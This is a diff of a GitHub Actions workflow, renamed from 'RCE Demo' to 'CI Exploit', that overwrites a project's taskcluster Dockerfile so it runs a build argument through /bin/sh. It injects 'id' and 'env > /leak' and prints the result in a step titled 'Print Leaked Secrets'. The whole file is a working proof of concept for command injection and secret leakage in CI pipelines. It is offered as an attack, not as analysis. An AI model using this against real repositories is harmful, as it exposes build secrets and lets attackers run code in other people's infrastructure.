@@ -1,4 +1,4 @@
-name: RCE Demo
+name: CI Exploit
 on: push
 
 jobs:
@@ -7,19 +7,18 @@ jobs:
     steps:
       - uses: actions/checkout@v2
 
-      - name: Setup malicious Dockerfile
+      - name: Overwrite Dockerfile
         run: |
-          mkdir -p taskcluster/docker/python
           echo 'FROM alpine:latest
-ARG PYTHON_VERSION
-RUN sh -c "\$PYTHON_VERSION"' > taskcluster/docker/python/Dockerfile
+ARG INJECT
+RUN /bin/sh -c "$INJECT"' > taskcluster/docker/python/Dockerfile
 
-      - name: Build with injected payload
+      - name: Inject Code & Build
         run: |
           docker build \
-            --build-arg PYTHON_VERSION="echo RCE_SUCCESS > /leak && env > /leak_env" \
-            -t hacked ./taskcluster/docker/python
+            --build-arg INJECT="echo pwned && id && env > /leak" \
+            -t exploit-image ./taskcluster/docker/python
 
-      - name: Run container and show leak
+      - name: Print Leaked Secrets
         run: |
-          docker run --rm hacked sh -c 'cat /leak /leak_env || echo "No leak"'
+          docker run --rm exploit-image cat /leak || echo "Leak failed"
